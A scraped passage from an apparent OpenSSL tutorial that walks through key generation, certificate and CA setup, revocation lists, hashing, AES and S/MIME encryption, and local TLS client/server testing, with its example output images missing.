key:openssl rsa -pubout -in RSApriv.pem -out RSApub.pemHere are what the public and private keys look like:Eliptic CurveListing the support eliptic curves:openssl ecparam -list_curvesWe will be using the secp384r1 curve.Generating the private key:openssl ecparam -genkey -name secp384r1 -out ECpriv.pemGenerating the public key:openssl ec -in ECpriv.pem -pubout -out ECpub.pemHere are what the public and private keys look like:Certificate Signing Request (CSR) and generation of certificatesGenerating a signing request and the signing key:While generating this, we will be asked for our region/organization information.openssl req -new -newkey rsa:2048 -nodes -keyout CSRkey.pem -out CSR.pemGenerating an X509 certificate:openssl x509 -req -days 365 -in CSR.pem -signkey CSRkey.pem -out CSRCert.pemHere is what the X509 certificate looks like:**Certificate Revocation List (CRL) and revoking existing certificatesFor creating and using CRLs, we first need to configure a CA (Certficate Authority).Configuring a CA Create a new directory for your CA and navigate into that directory. Generate a symmetric key for the CA (we will be asked to set a key paraphrase in this step)openssl genpkey -algorithm RSA -out ca.key -aes256 Request an X509 certificate for the CA (we will be asked for region/organization information in this step)openssl req -x509 -new -nodes -key ca.key -sha256 -days 365 -out ca.crt Create a configuration file ca.cnf for your CA and ensure its contents are as follows: Replace /home/kali/Documents/Networks2/CA/ with the path to your CA directory Create necessary directories and files for your CA (in the CA directory) mkdir -p {certs,newcerts}touch index.txtecho 01&gt;serial Certificate Revocation List and revocation Revoking an existing certificate:openssl ca -config CA/ca.cnf -revoke CSRCert.pemGenerating a CRL to add revoked certificates:openssl ca -config CA/ca.cnf -gencrl -keyfile CA/ca.key -cert CA/ca.crt -out CRL.crlVerifying a certificate against an existing CRL (this step should give you the output ‚ÄúVerification failed‚Äù for a revoked certificate):openssl verify -crl_check -CAfile CA/ca.crt -CRLfile CRL.crl CSRCert.pem** Message Digest (Hash) Calculation Listing supported message digest algorithms:openssl list -digest-algorithmsGetting the message digest of a file:openssl &lt;hash_algorithm&gt; &lt;file_name&gt;Example MD5 calculation:Example SHA1 calculation:Example SHA256 calculation:** Symmetric Encryption/Decryption Listing supported ciphers:openssl list -cipher-algorithmsWe can use AES-256-CBC as an example. Create a text file:echo \"THIS IS A TEST FILE\" &gt; plaintext.txt Encrypt the text file:openssl enc -aes-256-cbc -in plaintext.txt -out ciphertext.encHere is what the encrypted file looks like: Decrypt the encrypted file:openssl enc -aes-256-cbc -d -in ciphertext.enc -out plaintext2.txt** SSL/TLS Client/Server Testing Generating server key and certificate:openssl req -newkey rsa:2048 -nodes -keyout SERV.key -x509 -days 365 -out SERV.crtGenerating client key and certificate:openssl req -newkey rsa:2048 -nodes -keyout CLIENT.key -x509 -days 365 -out CLIENT.crtStarting an SSL server on port 4433:openssl s_server -accept 4433 -key SERV.key -cert SERV.crtUsing an SSL client to connect to the SSL server:openssl s_client -connect localhost:4433 -key CLIENT.key -cert CLIENT.crtHere is an example of a basic TLS client/server communication using OpenSSL:** Mail Encryption/Decryption using S/MIME Generating a key and certificate for the recipient:openssl req -newkey rsa:2048 -nodes -keyout KEY.pem -x509 -days 365 -out CERTIFICATE.pemEncrypting the mail with the recipient‚Äôs public key:openssl smime -encrypt -aes256 -in plaintext.txt -out ciphertext.enc -outform DER CERTIFICATE.pemDecrypting the mail with the recipient‚Äôs private key:openssl smime -decrypt -in ciphertext.enc -inform DER -out plaintext2.txt -inkey KEY.pemHere is an example output of what ‚ÄúTHIS IS A VERY IMPORTANT MAIL‚Äù looks like when it is encrypted: ConclusionAfter exploring just about 30% of the use cases of OpenSSL, we can see how comprehensive and powerful the tool is for cryptography tests and network security. All large organizations use OpenSSL for the testing and their security protocols and you should too. OpenSSL is a lifesaver and automates countless procedures that you would follow manually." } ]
